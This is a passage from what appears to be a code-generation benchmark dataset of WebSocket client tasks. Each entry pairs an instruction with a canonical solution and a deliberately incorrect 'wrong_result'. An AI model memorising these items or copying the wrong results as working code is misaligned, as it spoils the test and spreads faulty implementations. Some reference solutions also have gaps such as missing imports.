callback: Optional[Callable[[\"Future[Union[None, str, bytes]]\"], None]] = None,\n    ) -> Awaitable[Union[None, str, bytes]]:\n        awaitable = self.read_queue.get()\n        if callback is not None:\n            self.io_loop.add_future(asyncio.ensure_future(awaitable), callback)\n        return awaitable\n\n    def _on_message(\n        self, message: Union[None, str, bytes]\n    ) -> Optional[Awaitable[None]]:\n        if self._on_message_callback:\n            self._on_message_callback(message)\n            return None\n        else:\n            return self.read_queue.put(message)\n\n    def ping(self, data: bytes = b\"\") -> None:\n        data = utf8(data)\n        if self.protocol is None:\n            raise WebSocketClosedError()\n        self.protocol.write_ping(data)\n\n    def get_websocket_protocol(self) -> \"WebSocketProtocol\":\n        return WebSocketProtocol13(self, mask_outgoing=True, params=self.params)\n\n    @property\n    def selected_subprotocol(self) -> Optional[str]:\n        return self.protocol.selected_subprotocol\n\nclass _WebSocketParams:\n    def __init__(\n        self,\n        ping_interval: Optional[float] = None,\n        ping_timeout: Optional[float] = None,\n        max_message_size: int = _default_max_message_size,\n        compression_options: Optional[Dict[str, Any]] = None,\n    ) -> None:\n        self.ping_interval = ping_interval\n        self.ping_timeout = ping_timeout\n        self.max_message_size = max_message_size\n        self.compression_options = compression_options\n\nclass WebSocketProtocol(abc.ABC):\n    def __init__(self, handler: Any) -> None:\n        self.handler = handler\n        self.stream = None\n        self.client_terminated = False\n        self.server_terminated = False\n\n    def close(self, code: Optional[int] = None, reason: Optional[str] = None) -> None:\n        raise NotImplementedError()\n\n    def is_closing(self) -> bool:\n        raise NotImplementedError()\n\n    async def accept_connection(self, handler: Any) -> None:\n        raise NotImplementedError()\n\n    def write_message(\n        self, message: Union[str, bytes, Dict[str, Any]], binary: bool = False\n    ) -> \"Future[None]\":\n        raise NotImplementedError()\n\n    @property\n    def selected_subprotocol(self) -> Optional[str]:\n        raise NotImplementedError()\n\n    def write_ping(self, data: bytes) -> None:\n        raise NotImplementedError()\n\n    def _process_server_headers(\n        self, key: Union[str, bytes], headers: httputil.HTTPHeaders\n    ) -> None:\n        raise NotImplementedError()\n\n    def start_pinging(self) -> None:\n        raise NotImplementedError()\n\n    async def _receive_frame_loop(self) -> None:\n        raise NotImplementedError()\n\n    def set_nodelay(self, x: bool) -> None:\n        raise NotImplementedError()\n\nclass WebSocketProtocol13(WebSocketProtocol):\n    FIN = 0x80\n    RSV1 = 0x40\n    RSV2 = 0x20\n    RSV3 = 0x10\n    RSV_MASK = RSV1 | RSV2 | RSV3\n    OPCODE_MASK = 0x0F\n\n    def __init__(\n        self,\n        handler: Any,\n        mask_outgoing: bool,\n        params: _WebSocketParams,\n    ) -> None:\n        super().__init__(handler)\n        self.mask_outgoing = mask_outgoing\n        self.params = params\n        self._final_frame = False\n        self._frame_opcode = None\n        self._frame_mask = None\n        self._frame_length = None\n        self._fragmented_message_buffer = None\n        self._fragmented_message_opcode = None\n        self._waiting = None\n        self._compression_options = params.compression_options\n        self._decompressor = None\n        self._compressor = None\n        self._frame_compressed = None\n        self._message_bytes_in = 0\n        self._message_bytes_out = 0\n        self._wire_bytes_in = 0\n        self._wire_bytes_out = 0\n        self.ping_callback = None\n        self.last_ping = 0.0\n        self.last_pong = 0.0\n        self.close_code = None\n        self.close_reason = None\n\n    @property\n    def selected_subprotocol(self) -> Optional[str]:\n        return self._selected_subprotocol\n\n    @selected_subprotocol.setter\n    def selected_subprotocol(self, value: Optional[str]) -> None:\n        self._selected_subprotocol = value\n\n    def _process_server_headers(\n        self, key: Union[str, bytes], headers: httputil.HTTPHeaders\n    ) -> None:\n        assert headers[\"Upgrade\"].lower() == \"websocket\"\n        assert headers[\"Connection\"].lower() == \"upgrade\"\n        accept = self.compute_accept_value(key)\n        assert headers[\"Sec-Websocket-Accept\"] == accept\n\n        extensions = self._parse_extensions_header(headers)\n        for ext in extensions:\n            if ext[0] == \"permessage-deflate\" and self._compression_options is not None:\n                self._create_compressors(\"client\", ext[1])\n            else:\n                raise ValueError(\"unsupported extension %r\", ext)\n\n        self.selected_subprotocol = headers.get(\"Sec-WebSocket-Protocol\", None)\n\n    def write_message(\n        self, message: Union[str, bytes, Dict[str, Any]], binary: bool = False\n    ) -> \"Future[None]\":\n        if binary:\n            opcode = 0x2\n        else:\n            opcode = 0x1\n        if isinstance(message, dict):\n            message = tornado.escape.json_encode(message)\n        message = tornado.escape.utf8(message)\n        assert isinstance(message, bytes)\n        self._message_bytes_out += len(message)\n        flags = 0\n        if self._compressor:\n            message = self._compressor.compress(message)\n            flags |= self.RSV1\n        try:\n            fut = self._write_frame(True, opcode, message, flags=flags)\n        except StreamClosedError:\n            raise WebSocketClosedError()\n\n        async def wrapper() -> None:\n            try:\n                await fut\n            except StreamClosedError:\n                raise WebSocketClosedError()\n\n        return asyncio.ensure_future(wrapper())\n\n    def write_ping(self, data: bytes) -> None:\n        assert isinstance(data, bytes)\n        self._write_frame(True, 0x9, data)\n\n    def close(self, code: Optional[int] = None, reason: Optional[str] = None) -> None:\n        if not self.server_terminated:\n            if not self.stream.closed():\n                if code is None and reason is not None:\n                    code = 1000\n                if code is None:\n                    close_data = b\"\"\n                else:\n                    close_data = struct.pack(\">H\", code)\n                if reason is not None:\n                    close_data += utf8(reason)\n                try:\n                    self._write_frame(True, 0x8, close_data)\n                except StreamClosedError:\n                    self._abort()\n            self.server_terminated = True\n        if self.client_terminated:\n            if self._waiting is not None:\n                self.stream.io_loop.remove_timeout(self._waiting)\n                self._waiting = None\n            self.stream.close()\n        elif self._waiting is None:\n            self._waiting = self.stream.io_loop.add_timeout(\n                self.stream.io_loop.time() + 5, self._abort\n            )\n        if self.ping_callback:\n            self.ping_callback.stop()\n            self.ping_callback = None\n\n    def is_closing(self) -> bool:\n        return self.stream.closed() or self.client_terminated or self.server_terminated\n\n    def start_pinging(self) -> None:\n        if self.ping_interval is not None and self.ping_interval > 0:\n            self.last_ping = self.last_pong = IOLoop.current().time()\n            self.ping_callback = PeriodicCallback(\n                self.periodic_ping, self.ping_interval * 1000\n            )\n            self.ping_callback.start()\n\n    @staticmethod\n    def compute_accept_value(key: Union[str, bytes]) -> str:\n        sha1 = hashlib.sha1()\n        sha1.update(utf8(key))\n        sha1.update(b\"258EAFA5-E914-47DA-95CA-C5AB0DC85B11\")\n        return native_str(base64.b64encode(sha1.digest()))\n\n    def _parse_extensions_header(\n        self, headers: httputil.HTTPHeaders\n    ) -> List[Tuple[str, Dict[str, str]]]:\n        extensions = headers.get(\"Sec-WebSocket-Extensions\", \"\")\n        if extensions:\n            return [httputil._parse_header(e.strip()) for e in extensions.split(\",\")]\n        return []\n\n    def _write_frame(\n        self, fin: bool, opcode: int, data: bytes, flags: int = 0\n    ) -> \"Future[None]\":\n        data_len = len(data)\n        if opcode & 0x8:\n            if not fin:\n                raise ValueError(\"control frames may not be fragmented\")\n            if data_len > 125:\n                raise ValueError(\"control frame payloads may not exceed 125 bytes\")\n        if fin:\n            finbit = self.FIN\n        else:\n            finbit = 0\n        frame = struct.pack(\"B\", finbit | opcode | flags)\n        if self.mask_outgoing:\n            mask_bit = 0x80\n        else:\n            mask_bit = 0\n        if data_len < 126:\n            frame += struct.pack(\"B\", data_len | mask_bit)\n        elif data_len <= 0xFFFF:\n            frame += struct.pack(\"!BH\", 126 | mask_bit, data_len)\n        else:\n            frame += struct.pack(\"!BQ\", 127 | mask_bit, data_len)\n        if self.mask_outgoing:\n            mask = os.urandom(4)\n            data = mask + _websocket_mask(mask, data)\n        frame += data\n        self._wire_bytes_out += len(frame)\n        return self.stream.write(frame)\n\ndef websocket_connect(\n    url: Union[str, httpclient.HTTPRequest],\n    callback: Optional[Callable[[\"Future[WebSocketClientConnection]\"], None]] = None,\n    connect_timeout: Optional[float] = None,\n    on_message_callback: Optional[Callable[[Union[None, str, bytes]], None]] = None,\n    compression_options: Optional[Dict[str, Any]] = None,\n    ping_interval: Optional[float] = None,\n    ping_timeout: Optional[float] = None,\n    max_message_size: int = _default_max_message_size,\n    subprotocols: Optional[List[str]] = None,\n    resolver: Optional[Resolver] = None,\n) -> \"Awaitable[WebSocketClientConnection]\":\n    if isinstance(url, httpclient.HTTPRequest):\n        assert connect_timeout is None\n        request = url\n        request.headers = httputil.HTTPHeaders(request.headers)\n    else:\n        request = httpclient.HTTPRequest(url, connect_timeout=connect_timeout)\n    request = cast(\n        httpclient.HTTPRequest,\n        httpclient._RequestProxy(request, httpclient.HTTPRequest._DEFAULTS),\n    )\n    conn = WebSocketClientConnection(\n        request,\n        on_message_callback=on_message_callback,\n        compression_options=compression_options,\n        ping_interval=ping_interval,\n        ping_timeout=ping_timeout,\n        max_message_size=max_message_size,\n        subprotocols=subprotocols,\n        resolver=resolver,\n    )\n    if callback is not None:\n        IOLoop.current().add_future(conn.connect_future, callback)\n    return conn.connect_future",
    "Code_level": "Class-level",
    "FSMID_for_test": 51,
    "wrong_result": "```python\nfrom tornado import gen, ioloop, tcpclient, web\nfrom tornado.httpclient import HTTPClient, HTTPRequest, HTTPResponse\nfrom tornado.websocket import WebSocketClientConnection, WebSocketProtocol\nfrom tornado.queues import Queue\nfrom typing import Optional, Callable, Dict, List, Union, Awaitable, Any\nimport asyncio\n\nclass WebSocketClientConnection(WebSocketClientConnection):\n    def __init__(self, request: HTTPRequest, on_message_callback: Optional[Callable] = None, compression_options: Optional[Dict] = None,\n                 ping_interval: Optional[float] = None, ping_timeout: Optional[float] = None, max_message_size: int = 1024 * 1024,\n                 subprotocols: Optional[List[str]] = None, resolver: Optional[Any] = None) -> None:\n        super().__init__(\n            request=request,\n            on_message_callback=on_message_callback,\n            compression_options=compression_options,\n            ping_interval=ping_interval,\n            ping_timeout=ping_timeout,\n            max_message_size=max_message_size,\n            subprotocols=subprotocols,\n            resolver=resolver\n        )\n        self.read_queue = Queue()\n\n    def close(self, code: Optional[int] = None, reason: Optional[str] = None) -> None:\n        if not self.closed:\n            super().close(code, reason)\n\n    def on_connection_close(self) -> None:\n        self.read_queue.put_nowait(None)\n        super().on_connection_close()\n\n    def on_ws_connection_close(self, close_code: Optional[int], close_reason: Optional[str]) -> None:\n        self.close_code = close_code\n        self.close_reason = close_reason\n        super().on_ws_connection_close(close_code, close_reason)\n\n    async def _on_http_response(self, response: HTTPResponse) -> None:\n        if response.code == 101:\n            await self._handshake_future\n        else:\n            raise Exception(f\"Unexpected HTTP status {response.code}\")\n\n    async def headers_received(self, start_line: Union[web.RequestStartLine, web.ResponseStartLine], headers: web.HTTPHeaders) -> Awaitable[None]:\n        pass\n\n    async def read_message(self, callback: Optional[Callable] = None) -> Union[None, str, bytes]:\n        message = await self.read_queue.get()\n        if callback:\n            callback(message)\n        return message\n\n    def _on_message(self, message: Union[None, str, bytes]) -> Optional[Awaitable[None]]:\n        if message is None:\n            self.read_queue.put_nowait(None)\n        else:\n            self.read_queue.put_nowait(message)\n        if self._on_message_callback:\n            return self._on_message_callback(message)\n\n    def ping(self, data: bytes) -> None:\n        super().ping(data)\n\n    def get_websocket_protocol(self) -> WebSocketProtocol:\n        return WebSocketProtocol()\n```"
  },
  {
    "Task_id": 439,
    "Instruction": "Task Description: Implement a WebSocket client class for streaming financial market data with authentication, subscription management, and message handling capabilities.\n\nClass Description: The _DataStream class establishes and maintains a WebSocket connection to a financial data streaming service. It handles authentication, manages subscriptions to different types of market data (trades, quotes, bars), processes incoming messages, and provides methods for controlling the connection lifecycle.\n\nAttributes:\n- _endpoint: str - WebSocket server URL\n- _key_id: str - API key for authentication\n- _secret_key: str - API secret for authentication\n- _ws: WebSocketClientProtocol - Active WebSocket connection\n- _running: bool - Connection status flag\n- _loop: asyncio.AbstractEventLoop - Event loop reference\n- _raw_data: bool - Flag for raw data processing\n- _stop_stream_queue: queue.Queue - Queue for stop signals\n- _handlers: Dict[str, Dict] - Dictionary of message handlers per data type\n- _name: str - Connection name identifier\n- _should_run: bool - Control flag for main loop\n- _max_frame_size: int - Maximum WebSocket frame size\n- _websocket_params: Dict - WebSocket connection parameters\n\nMethods:\n- __init__(endpoint: str, key_id: str, secret_key: str, raw_data: bool = False, websocket_params: Optional[Dict] = None) -> None - Initialize the data stream with connection parameters\n- _connect() -> None - Establish WebSocket connection\n- _auth() -> None - Authenticate with the server\n- _start_ws() -> None - Combined connection and authentication\n- close() -> None - Close the WebSocket connection\n- stop_ws() -> None - Signal to stop the WebSocket connection\n- _consume() -> None - Main message processing loop\n- _dispatch(msg: Dict) -> None - Route messages to appropriate handlers\n- _subscribe(handler: Callable, symbols: List[str], handlers: Dict) -> None - Internal subscription management\n- _subscribe_all() -> None - Send all active subscriptions to server\n- _run_forever() -> None - Main connection management loop\n- subscribe_trades(handler: Callable, *symbols: str) -> None - Subscribe to trade data\n- subscribe_quotes(handler: Callable, *symbols: str) -> None - Subscribe to quote data\n- subscribe_bars(handler: Callable, *symbols: str) -> None - Subscribe to bar data\n- subscribe_updated_bars(handler: Callable, *symbols: str) -> None - Subscribe to updated bar data\n- subscribe_daily_bars(handler: Callable, *symbols: str) -> None - Subscribe to daily bar data\n- stop() -> None - Stop the WebSocket connection and processing",
    "Canonical_solution": "import asyncio\nimport websockets\nimport msgpack\nimport queue\nfrom typing import Dict, Optional\n\nclass _DataStream:\n    def __init__(self,\n                 endpoint: str,\n                 key_id: str,\n                 secret_key: str,\n                 raw_data: bool = False,\n                 websocket_params: Optional[Dict] = None) -> None:\n        self._endpoint = endpoint\n        self._key_id = key_id\n        self._secret_key = secret_key\n        self._ws = None\n        self._running = False\n        self._loop = None\n        self._raw_data = raw_data\n        self._stop_stream_queue = queue.Queue()\n        self._handlers = {\n            'trades':      {},\n            'quotes':      {},\n            'bars':        {},\n            'updatedBars': {},\n            'dailyBars':   {},\n        }\n        self._name = 'data'\n        self._should_run = True\n        self._max_frame_size = 32768\n        self._websocket_params = websocket_params or {\n            \"ping_interval\": 10,\n            \"ping_timeout\": 180,\n            \"max_queue\": 1024,\n        }\n\n    async def _connect(self):\n        self._ws = await websockets.connect(\n            self._endpoint,\n            extra_headers={'Content-Type': 'application/msgpack'},\n            **self._websocket_params\n        )\n        r = await self._ws.recv()\n        msg = msgpack.unpackb(r)\n        if msg[0]['T'] != 'success' or msg[0]['msg'] != 'connected':\n            raise ValueError('connected message not received')\n\n    async def _auth(self):\n        await self._ws.send(\n            msgpack.packb({\n                'action': 'auth',\n                'key':    self._key_id,\n                'secret': self._secret_key,\n            }))\n        r = await self._ws.recv()\n        msg = msgpack.unpackb(r)\n        if msg[0]['T'] == 'error':\n            raise ValueError(msg[0].get('msg', 'auth failed'))\n        if msg[0]['T'] != 'success' or msg[0]['msg'] != 'authenticated':\n            raise ValueError('failed to authenticate')\n\n    async def _start_ws(self):\n        await self._connect()\n        await self._auth()\n\n    async def close(self):\n        if self._ws:\n            await self._ws.close()\n            self._ws = None\n            self._running = False\n\n    async def stop_ws(self):\n        self._should_run = False\n        if self._stop_stream_queue.empty():\n            self._stop_stream_queue.put_nowait({\"should_stop\": True})\n\n    async def _consume(self):\n        while True:\n            if not self._stop_stream_queue.empty():\n                self._stop_stream_queue.get(timeout=1)\n                await self.close()\n                break\n            else:\n                try:\n                    r = await asyncio.wait_for(self._ws.recv(), 5)\n                    msgs = msgpack.unpackb(r)\n                    for msg in msgs:\n                        await self._dispatch(msg)\n                except asyncio.TimeoutError:\n                    pass\n\n    async def _dispatch(self, msg):\n        msg_type = msg.get('T')\n        symbol = msg.get('S')\n        if msg_type == 't':\n            handler = self._handlers['trades'].get(\n                symbol, self._handlers['trades'].get('*', None))\n            if handler:\n                await handler(self._cast(msg_type, msg))\n        elif msg_type == 'q':\n            handler = self._handlers['quotes'].get(\n                symbol, self._handlers['quotes'].get('*', None))\n            if handler:\n                await handler(self._cast(msg_type, msg))\n        elif msg_type == 'b':\n            handler = self._handlers['bars'].get(\n                symbol, self._handlers['bars'].get('*', None))\n            if handler:\n                await handler(self._cast(msg_type, msg))\n        elif msg_type == 'u':\n            handler = self._handlers['updatedBars'].get(\n                symbol, self._handlers['updatedBars'].get('*', None))\n            if handler:\n                await handler(self._cast(msg_type, msg))\n        elif msg_type == 'd':\n            handler = self._handlers['dailyBars'].get(\n                symbol, self._handlers['dailyBars'].get('*', None))\n            if handler:\n                await handler(self._cast(msg_type, msg))\n        elif msg_type == 'error':\n            log.error(f'error: {msg.get(\"msg\")} ({msg.get(\"code\")})')\n\n    def _subscribe(self, handler, symbols, handlers):\n        for symbol in symbols:\n            handlers[symbol] = handler\n        if self._running:\n            asyncio.run_coroutine_threadsafe(\n                self._subscribe_all(), self._loop\n            ).result()\n\n    async def _subscribe_all(self):\n        msg = defaultdict(list)\n        for k, v in self._handlers.items():\n            if v:\n                for s in v.keys():\n                    msg[k].append(s)\n        msg['action'] = 'subscribe'\n        bs = msgpack.packb(msg)\n        frames = (bs[i:i+self._max_frame_size]\n                  for i in range(0, len(bs), self._max_frame_size))\n        await self._ws.send(frames)\n\n    async def _run_forever(self):\n        self._loop = asyncio.get_running_loop()\n        while not any(v for k, v in self._handlers.items()):\n            if not self._stop_stream_queue.empty():\n                self._stop_stream_queue.get(timeout=1)\n                return\n            await asyncio.sleep(0.1)\n        self._should_run = True\n        self._running = False\n        while True:\n            try:\n                if not self._should_run:\n                    return\n                if not self._running:\n                    await self._start_ws()\n                    await self._subscribe_all()\n                    self._running = True\n                await self._consume()\n            except websockets.WebSocketException as wse:\n                await self.close()\n                self._running = False\n            finally:\n                await asyncio.sleep(0.01)\n\n    def subscribe_trades(self, handler, *symbols):\n        self._subscribe(handler, symbols, self._handlers['trades'])\n\n    def subscribe_quotes(self, handler, *symbols):\n        self._subscribe(handler, symbols, self._handlers['quotes'])\n\n    def subscribe_bars(self, handler, *symbols):\n        self._subscribe(handler, symbols, self._handlers['bars'])\n\n    def subscribe_updated_bars(self, handler, *symbols):\n        self._subscribe(handler, symbols, self._handlers['updatedBars'])\n\n    def subscribe_daily_bars(self, handler, *symbols):\n        self._subscribe(handler, symbols, self._handlers['dailyBars'])\n\n    def stop(self):\n        if self._loop.is_running():\n            asyncio.run_coroutine_threadsafe(\n                self.stop_ws(),\n                self._loop).result()",
    "Code_level": "Class-level",
    "FSMID_for_test": 46,
    "wrong_result": "```python\nimport asyncio\nimport websockets\nimport json\nimport base64\nimport hmac\nimport hashlib\nimport time\nfrom typing import Dict, List, Callable, Optional\n\nclass _DataStream:\n    def __init__(self, endpoint: str, key_id: str, secret_key: str, raw_data: bool = False, websocket_params: Optional[Dict] = None) -> None:\n        self._endpoint = endpoint\n        self._key_id = key_id\n        self._secret_key = secret_key\n        self._ws = None\n        self._running = False\n        self._loop = asyncio.get_event_loop()\n        self._raw_data = raw_data\n        self._stop_stream_queue = asyncio.Queue()\n        self._handlers = {\n            \"trades\": {},\n            \"quotes\": {},\n            \"bars\": {},\n            \"updated_bars\": {},\n            \"daily_bars\": {}\n        }\n        self._name = \"default\"\n        self._should_run = True\n        self._max_frame_size = 1024 * 1024\n        self._websocket_params = websocket_params or {}\n\n    async def _connect(self) -> None:\n        params = self._websocket_params.copy()\n        params[\"max_size\"] = self._max_frame_size\n        self._ws = await websockets.connect(self._endpoint, **params)\n\n    async def _auth(self) -> None:\n        timestamp = int(time.time() * 1000)\n        message = f\"{timestamp}:connect:{self._key_id}\"\n        signature = hmac.new(\n            self._secret_key.encode(), message.encode(), hashlib.sha256\n        ).hexdigest()\n        auth_message = {\n            \"type\": \"auth\",\n            \"key_id\": self._key_id,\n            \"signature\": signature,\n            \"timestamp\": timestamp\n        }\n        await self._ws.send(json.dumps(auth_message))\n\n    async def _start_ws(self) -> None:\n        await self._connect()\n        await self._auth()\n        self._running = True\n        asyncio.create_task(self._consume())\n        asyncio.create_task(self._run_forever())\n\n    async def close(self) -> None:\n        if self._ws and not self._ws.closed:\n            await self._ws.close()\n        self._running = False\n\n    async def stop_ws(self) -> None:\n        await self._stop_stream_queue.put(True)\n\n    async def _consume(self) -> None:\n        while self._running and self._ws and not self._ws.closed:\n            try:\n                message = await self._ws.recv()\n                if not self._raw_data:\n                    msg_data = json.loads(message)\n                    self._dispatch(msg_data)\n                else:\n                    self._dispatch(message)\n            except Exception as e:\n                print(f\"Error consuming message: {e}\")\n                break\n\n    def _dispatch(self, msg: Dict) -> None:\n        if isinstance(msg, str):\n            return\n        if \"data_type\" in msg:\n            data_type = msg[\"data_type\"]\n            symbol = msg.get(\"symbol\")\n            if data_type in self._handlers and symbol in self._handlers[data_type]:\n                for handler in self._handlers[data_type][symbol][\"handlers\"]:\n                    handler(msg)\n\n    def _subscribe(self, handler: Callable, symbols: List[str], handlers: Dict) -> None:\n        for symbol in symbols:\n            if symbol not in handlers:\n                handlers[symbol] = {\"handlers\": []}\n            handlers[symbol][\"handlers\"].append(handler)\n\n    async def _subscribe_all(self) -> None:\n        subscriptions = []\n        for data_type, subs in self._handlers.items():\n            for symbol, info in subs.items():\n                subscriptions.append({\n                    \"type\": \"subscribe\",\n                    \"data_type\": data_type,\n                    \"symbol\": symbol\n                })\n        if subscriptions:\n            await self._ws.send(json.dumps({\"type\": \"subscriptions\", \"data\": subscriptions}))\n\n    async def _run_forever(self) -> None:\n        while self._should_run:\n            try:\n                await asyncio.sleep(1)\n            except asyncio.CancelledError:\n                break\n\n    def subscribe_trades(self, handler: Callable, *symbols: str) -> None:\n        self._subscribe(handler, list(symbols), self._handlers[\"trades\"])\n\n    def subscribe_quotes(self, handler: Callable, *symbols: str) -> None:\n        self._subscribe(handler, list(symbols), self._handlers[\"quotes\"])\n\n    def subscribe_bars(self, handler: Callable, *symbols: str) -> None:\n        self._subscribe(handler, list(symbols), self._handlers[\"bars\"])\n\n    def subscribe_updated_bars(self, handler: Callable, *symbols: str) -> None:\n        self._subscribe(handler, list(symbols), self._handlers[\"updated_bars\"])\n\n    def subscribe_daily_bars(self, handler: Callable, *symbols: str) -> None:\n        self._subscribe(handler, list(symbols), self._handlers[\"daily_bars\"])\n\n    async def stop(self) -> None:\n        self._should_run = False\n        await self.close()\n```"
  },
  {
    "Task_id": 440,
    "Instruction": "Task Description: Create a WebSocket client in Python using asyncio and websockets libraries to connect to a WebSocket server, subscribe to a channel, and receive messages, optionally decompressing them if they are gzipped.\n\nFunction Description: The function establishes a WebSocket connection to a specified URI, sends a subscription message, and receives a specified number of messages from the server. It can handle gzip-compressed messages by decompressing them before display.\n\nInput:\n- uri (str): The WebSocket server URI to connect to (e.g., 'wss://api.huobi.pro/ws').\n- sub (str): The subscription message to send to the server (e.g., '{\"sub\": \"market.btcusdt.trade.detail\", \"id\": 4}').\n- is_gzip (bool): A flag indicating whether the received messages are gzip-compressed.\n- count (int): The number of messages to receive before exiting.\n\nOutput: None (The function prints received messages to the console).",
    "Canonical_solution": "import argparse\nimport asyncio\nimport zlib\nimport websockets\n\nasync def websocket_client(uri, sub, is_gzip, count):\n    async with websockets.connect(uri) as websocket:\n        await websocket.send(sub)\n        print(f\"> {sub}\")\n\n        for i in range(count):\n            response = await websocket.recv()\n            if not is_gzip:\n                print(f\"< {response}\")\n            else:\n                print(f\"< {zlib.decompress(response, 16 + zlib.MAX_WBITS)}\")\n\nif __name__ == '__main__':\n    parser = argparse.ArgumentParser()\n    parser.add_argument('--uri', default='wss://api.huobi.pro/ws', help='URI to connect to')\n    parser.add_argument('--sub', default='{\"sub\": \"market.btcusdt.trade.detail\", \"id\": 4}', help='Subscription string')\n    parser.add_argument('--count', default=3, type=int, help='Number of messages to receive before exiting')\n    parser.add_argument('-z', action='store_true', help='Use gzip on messages')\n    args = parser.parse_args()\n\n    asyncio.get_event_loop().run_until_complete(\n        websocket_client(args.uri, args.sub, args.z, args.count)\n    )",
    "Code_level": "Function-level",
    "FSMID_for_test": 46,
    "wrong_result": "```python\nimport asyncio\nimport websockets\nimport gzip\nimport json\n\nasync def websocket_client(uri, sub, is_gzip, count):\n    async with websockets.connect(uri) as websocket:\n        await websocket.send(sub)\n\n        received = 0\n        while received < count:\n            message = await websocket.recv()\n            if is_gzip:\n                decompressed = gzip.decompress(message).decode('utf-8')\n                print(decompressed)\n            else:\n                print(message)\n            received += 1\n```"
  },
  {
    "Task_id": 443,
    "Instruction": "Task Description: Implement a WebSocket client class for chat applications that handles connection, message sending/receiving, and error events with proper threading and queue management.\n\nClass Description: ChatWebSocket is a WebSocket client implementation that manages WebSocket connections for chat applications. It handles message sending/receiving, connection events, and errors while maintaining thread safety through queue-based message processing.\n\nAttributes:\n- _parent: [weakref.ref] - Weak reference to the parent object to avoid circular references\n- ws: [WebSocketApp] - The WebSocket client instance\n- _inQueue: [Queue] - Thread-safe queue for outgoing messages\n- sendThread: [Thread] - Thread for processing outgoing messages\n\nMethods:\n- __init__(parent) -> None - Initializes the WebSocket client with a parent reference and starts the send thread\n- parent() -> object - Property that dereferences the weakref to the parent object\n- Stop() -> None - Stops the send thread by putting an empty string in the queue\n- SendDataRun() -> None - Thread target function that processes messages from the queue\n- _SendData(data) -> None - Internal method for sending data and emitting appropriate events\n- _Send(msg) -> None - Internal method for sending raw WebSocket messages\n- Send(data) -> None - Public method to queue data for sending\n- on_message(ws, message) -> None - Callback for received WebSocket messages\n- on_error(ws, error) -> None - Callback for WebSocket errors\n- on_close(ws) -> None - Callback for WebSocket connection close\n- on_open(ws) -> None - Callback for WebSocket connection open\n- Start(url) -> None - Starts the WebSocket connection on the specified URL\n- Close() -> None - Closes the WebSocket connection",
    "Canonical_solution": "import threading\nimport weakref\nfrom queue import Queue\nimport websocket\n\nclass ChatWebSocket:\n    def __init__(self, parent):\n        self._parent = weakref.ref(parent)\n        self.ws = None\n        self._inQueue = Queue()\n        self.sendThread = threading.Thread(target=self.SendDataRun)\n        self.sendThread.setName(\"ChatSendThread\")\n        self.sendThread.setDaemon(True)\n        self.sendThread.start()\n\n    @property\n    def parent(self):\n        return self._parent()\n\n    def Stop(self):\n        self._inQueue.put(\"\")\n\n    def SendDataRun(self):\n        while True:\n            task = self._inQueue.get(True)\n            self._inQueue.task_done()\n            try:\n                if task == \"\":\n                    break\n                self._SendData(task)\n            except Exception as es:\n                pass\n\n    def _SendData(self, data):\n        self._Send(data)\n        if \"send_image\" in data:\n            self.parent.websocket.emit(self.parent.SendImg, data)\n        else:\n            self.parent.websocket.emit(self.parent.SendMsg2, data)\n\n    def _Send(self, msg):\n        try:\n            if self.ws:\n                self.ws.send(msg)\n        except Exception as es:\n            pass\n\n    def Send(self, data):\n        self._inQueue.put(data)\n\n    def on_message(self, ws, message):\n        self.parent.websocket.emit(self.parent.Msg, message)\n\n    def on_error(self, ws, error):\n        self.parent.websocket.emit(self.parent.ErrorMsg, str(error))\n\n    def on_close(self, ws):\n        self.parent.websocket.emit(self.parent.Leave, \"\")\n\n    def on_open(self, ws):\n        self.parent.websocket.emit(self.parent.Enter, \"\")\n\n    def Start(self, url):\n        url = url.replace(\"https\", \"wss\").replace(\"http\", \"ws\") + \"/socket.io/?EIO=3&transport=websocket\"\n        def Run():\n            ws = websocket.WebSocketApp(url,\n                                      on_open=self.on_open,\n                                      on_message=self.on_message,\n                                      on_error=self.on_error,\n                                      on_close=self.on_close)\n            self.ws = ws\n            ws.run_forever(ping_interval=30)\n\n        thread = threading.Thread(target=Run)\n        thread.setDaemon(True)\n        thread.start()\n\n    def Close(self):\n        if self.ws:\n            self.ws.close()\n            self.ws = None",
    "Code_level": "Class-level",
    "FSMID_for_test": 47,
    "wrong_result": "```python\nimport threading\nimport queue\nimport weakref\nfrom websocket import create_connection, WebSocketApp\n\nclass ChatWebSocket:\n    def __init__(self, parent):\n        self._parent = weakref.ref(parent)\n        self.ws = None\n        self._inQueue = queue.Queue()\n        self.sendThread = threading.Thread(target=self.SendDataRun, daemon=True)\n        self.sendThread.start()\n\n    @property\n    def parent(self):\n        return self._parent()\n\n    def Stop(self):\n        self._inQueue.put(\"\")\n\n    def SendDataRun(self):\n        while True:\n            data = self._inQueue.get()\n            if not data:\n                break\n            self._SendData(data)\n\n    def _SendData(self, data):\n        try:\n            self._Send(data)\n        except Exception as e:\n            print(f\"Send error: {e}\")\n\n    def _Send(self, msg):\n        if self.ws and self.ws.sock and self.ws.sock.connected:\n            self.ws.send(msg)\n\n    def Send(self, data):\n        self._inQueue.put(data)\n\n    def on_message(self, ws, message):\n        if self.parent:\n            self.parent.OnMessageReceived(message)\n\n    def on_error(self, ws, error):\n        if self.parent:\n            self.parent.OnError(error)\n\n    def on_close(self, ws):\n        if self.parent:\n            self.parent.OnConnectionClosed()\n\n    def on_open(self, ws):\n        if self.parent:\n            self.parent.OnConnectionOpened()\n\n    def Start(self, url):\n        self.ws = WebSocketApp(url,\n                               on_message=self.on_message,\n                               on_error=self.on_error,\n                               on_close=self.on_close,\n                               on_open=self.on_open)\n        wst = threading.Thread(target=self.ws.run_forever, daemon=True)\n        wst.start()\n\n    def Close(self):\n        if self.ws:\n            self.ws.close()\n```"
  },
  {
    "Task_id": 447,
    "Instruction": "Task Description: Implement a WebSocket connection manager class for handling multiple client connections, supporting different subprotocols (JSON and BYTES), and managing message sending/receiving.\n\nClass Description: The ConnectionManager class manages active WebSocket connections, handles different WebSocket subprotocols, and provides methods for sending/receiving messages in the appropriate format.\n\nAttributes:\n- active_connections: List[WebSocket] - Maintains a list of currently active WebSocket connections\n- protocol_dict: Dict[str, WebsocketSubProtocols] - Maps client addresses to their chosen subprotocols\n\nMethods:\n- get_client(websocket: WebSocket) -> str - Returns a string identifier for the client (host:port)\n- get_subprotocol(headers: Dict) -> WebsocketSubProtocols - Determines the subprotocol from request headers\n- connect(websocket: WebSocket) -> None - Accepts a new WebSocket connection and stores its subprotocol\n- disconnect(websocket: WebSocket) -> None - Removes a disconnected WebSocket from active connections\n- receive(websocket: WebSocket) -> Any - Receives a message from the WebSocket using the appropriate subprotocol\n- iter(websocket: WebSocket) -> 